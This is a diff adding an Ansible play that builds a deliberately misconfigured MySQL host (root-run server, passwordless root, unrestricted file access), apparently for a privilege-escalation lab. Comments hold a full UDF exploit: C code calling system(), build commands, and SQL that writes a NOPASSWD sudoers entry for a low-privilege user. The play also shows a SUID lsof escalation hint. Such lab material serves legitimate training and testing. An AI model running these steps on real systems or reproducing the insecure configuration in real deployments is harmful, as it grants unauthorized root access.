@@ -409,3 +409,87 @@
     - name: set the suid bit on the binary
       command: chmod u+s /home/lowpriv/elevated_lsof
       # cp /bin/bash lsof; export PATH="$HOME:$PATH"; ./elevated_lsof
+
+- name: mysql is running as root and allows file reads/writes from/to every direction
+  hosts: vuln_mysql_misconfig
+  gather_facts: true
+  remote_user: root
+  tasks:
+    - name: install gcc, libaio1 and libncurses6
+      apt:
+        name:
+          - gcc
+          - libaio1
+          - libncurses6
+        state: present
+
+    - name: download mysql
+      command: >
+        wget -O /tmp/mysql.tar.xz 
+        https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-8.0.36-linux-glibc2.28-x86_64.tar.xz
+      args:
+        creates: /tmp/mysql.tar.xz
+
+    - name: create mysql directory
+      file:
+        path: /var/mysql
+        state: directory
+
+    - name: check if mysql data directory already initialized
+      stat:
+        path: /var/mysql/data/mysql
+      register: mysql_data_dir
+
+    - name: extract mysql
+      unarchive:
+        src: /tmp/mysql.tar.xz
+        dest: /var/mysql
+        remote_src: yes
+        extra_opts: [--strip-components=1]
+      when: not mysql_data_dir.stat.exists
+
+    - name: initialize mysql
+      command: /var/mysql/bin/mysqld --initialize-insecure --basedir=/var/mysql --datadir=/var/mysql/data
+      when: not mysql_data_dir.stat.exists
+
+    - name: create mysql systemd service
+      copy:
+        dest: /etc/systemd/system/mysql.service
+        content: |
+          [Unit]
+          Description=Custom MySQL Server (Unsafe)
+          After=network.target
+
+          [Service]
+          Type=simple
+          ExecStart=/var/mysql/bin/mysqld --basedir=/var/mysql --datadir=/var/mysql/data --user=root --secure-file-priv=""
+          Restart=on-failure
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: restart systemctl
+      command: systemctl daemon-reload
+
+    - name: start the mysql service
+      systemd:
+        name: mysql
+        enabled: yes
+        state: started
+        # nano exploit.c
+        # include <mysql.h>
+        # int sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
+        #     return 0;
+        # }
+        # void sys_exec_deinit(UDF_INIT *initid) {}
+        # long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
+        #     return system(args->args[0]);
+        # }
+        # gcc -Wall -fPIC -shared exploit.c -o exploit.so -I/var/mysql/include
+        # /var/mysql/bin/mysql -u root
+        # SELECT LOAD_FILE('/home/lowpriv/exploit.so') INTO DUMPFILE '/var/mysql/lib/plugin/exploit.so';
+        # CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'exploit.so';
+        # SELECT sys_exec("echo 'lowpriv ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers");
+        # exit;
+        # sudo su
+
